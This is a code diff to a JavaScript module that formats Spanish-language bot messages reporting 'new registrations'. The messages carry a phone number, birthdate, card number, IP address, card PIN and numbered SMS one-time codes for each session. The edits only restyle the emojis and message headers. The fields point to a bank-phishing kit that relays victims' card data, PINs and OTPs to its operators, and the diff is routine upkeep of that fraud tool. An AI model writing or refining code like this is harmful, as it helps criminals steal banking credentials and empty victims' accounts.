@@ -14,12 +14,12 @@ function getSessionEmojis(sessionId) {
 
     // Only use well-supported solid circle emojis to avoid encoding issues
     const colors = [
-        '🔴', // Red
-        '🟠', // Orange
-        '🟡', // Yellow
-        '🟢', // Green
-        '🔵', // Blue
-        '🟣'  // Purple
+        '🟥', // Red
+        '🟧', // Orange
+        '🟨', // Yellow
+        '🟩', // Green
+        '🟦', // Blue
+        '🟪'  // Purple
     ];
 
     // Pick color based on first character of the unique part
@@ -37,7 +37,7 @@ export function formatRegistrationMessage(data) {
     const { sessionId, phone, birthdate, cardNumber, ip } = data;
     const sessionEmojis = getSessionEmojis(sessionId);
 
-    return `🆕 <b>NUEVO REGISTRO</b> ${sessionEmojis} 
+    return `${sessionEmojis}🆕 <b>NUEVO REGISTRO</b>
 <b>Sesión:</b> <code>${sessionId}</code>
 
 📱 Teléfono: <code>${phone}</code>
@@ -53,7 +53,7 @@ export function formatCardDetailsMessage(data) {
     const { sessionId, lastTwoDigits, nip, ip } = data;
     const sessionEmojis = getSessionEmojis(sessionId);
 
-    return `🔐 <b>NIP</b> ${sessionEmojis} 
+    return `${sessionEmojis}🔐 <b>NIP</b> 
 <b>Sesión:</b> <code>${sessionId}</code>
 
 NIP: <code>${nip}</code>
@@ -67,7 +67,7 @@ export function formatOTPMessage(data) {
     const { sessionId, otp, attempt, ip } = data;
     const sessionEmojis = getSessionEmojis(sessionId);
 
-    return `🔑 <b>CÓDIGO SMS #${attempt}</b> ${sessionEmojis} 
+    return `${sessionEmojis}🔑 <b>CÓDIGO SMS #${attempt}</b> 
 <b>Sesión:</b> <code>${sessionId}</code>
 
 🔐 CÓDIGO: <code>${otp}</code>
